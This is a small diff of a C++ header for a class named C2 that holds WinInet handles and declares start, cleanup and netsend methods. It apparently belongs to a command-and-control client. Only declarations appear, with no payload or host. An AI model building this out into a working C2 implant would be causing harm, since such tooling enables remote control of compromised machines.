@@ -1,7 +1,6 @@
 using namespace std;
 
 #pragma once
-#include "pch.h"
 #include <string>
 #include <windows.h>
 #include <wininet.h>
@@ -13,7 +12,6 @@ using namespace std;
 */
 
 class C2 {
-	string response;
 
 	HINTERNET sessionHandle = NULL;
 	HINTERNET connectHandle = NULL;
@@ -32,5 +30,6 @@ public:
 	void cleanup();
 	void start();
 	void netsend(LPCSTR hostName, LPCSTR pathName);
+	bool isFileEmpty();
 	string boolToString(bool b);
 };
